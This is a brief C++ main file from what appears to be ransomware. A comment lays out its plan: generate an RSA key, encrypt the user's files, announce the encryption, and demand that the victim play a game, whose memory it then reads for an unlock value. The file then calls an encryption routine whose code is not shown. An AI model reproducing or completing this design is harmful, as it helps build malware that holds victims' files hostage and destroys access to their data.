#include <iostream>

#include "Encryption.h"

int main()
{
	/*
	 * Steps of the program
	 *
	 * 1- Generate RSA key
	 * 2- Write RSA key to file to prevent accidental wrong encryption
	 * 3- Encrypt files
	 * 4- Show message that files were encrypted
	 * 5- Ask that the game can be played
	 * 6- Wait for the game to be launched
	 * 7- Read memory of game to find value
	 */

	Encryption ecr;
	ecr.run_encryption_logic();
}